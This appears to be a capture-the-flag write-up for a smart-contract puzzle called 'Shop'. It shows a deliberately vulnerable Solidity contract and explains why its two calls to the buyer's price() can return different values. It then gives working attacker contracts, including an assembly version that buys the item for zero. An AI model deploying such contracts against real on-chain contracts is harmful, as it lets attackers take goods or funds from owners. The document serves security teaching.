# 21. Shop

Сan you get the item from the shop for less than the price asked?

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price{gas:3300}() >= price && !isSold) {
      isSold = true;
      price = _buyer.price{gas:3300}();
    }
  }
}
```

## Vulnerability

The issue here is that _buyer could be a statefull contract that tracks the calls to `price()` in order to return two different values.
The first one `100` or more to pass `if (_buyer.price{gas:3300}() >= price && !isSold)` and the second one as low as possible to pay less on `price = _buyer.price{gas:3300}();`.

The naive approach of using a state variable doesn't work as writing to storage cost 20K gas, much more than the 3300 gas given...

A second approach was to read the `isSold` variable from the Shop contract.

```solidity
contract AttackerNaive {
    IShop immutable targetContract;
 
    constructor(IShop _targetContract) {
        targetContract = _targetContract;
    }

    function attack() public {
        targetContract.buy();
    }

    function price() public view returns (uint256) {
      if (targetContract.isSold() == false) {
        return 100;
      }

      return 0;
    }
}
```

But it doesn't work either as there is not enough gas... Solidity's bytecode contains many unnecessary OPCODES that just eat away the little bit of gas we were given. Plus it may read from storage depending on the mutability modifier you put on `targetContract` setting it to `immutable` or `constant` has the same result : revert..

So I went for an assembly version to have more control on the OPCODES and ensure no storage access for a lesser overall gas cost :

```solidity
contract Attacker {
    IShop immutable targetContract;
 
    constructor(IShop _targetContract) {
        targetContract = _targetContract;
    }

    function attack() public {
        targetContract.buy();
    }

    function price() public view returns (uint256 p) {

        bytes4 sig = 0xe852e741; // keccak256("isSold()")
        address addr = 0xCa305778dC31fc201e741812fFeC903B2E6c6E05; // Change it for your instance address

        assembly {
            let rvalue := mload(0x40)
            let ptr := add(rvalue, 0x20)
            mstore(ptr, sig)
            mstore(0x40, add(rvalue, 0x40))
            let success := staticcall(3000, addr, ptr, 4, rvalue, 32)

            switch mload(rvalue)
            case 0 {
              p := 100
            }
            default {
              p:= 0
            }
        }
    }
}
```
Which just does the same thing as the naive version but in a cheaper way. This code passes the challenge.
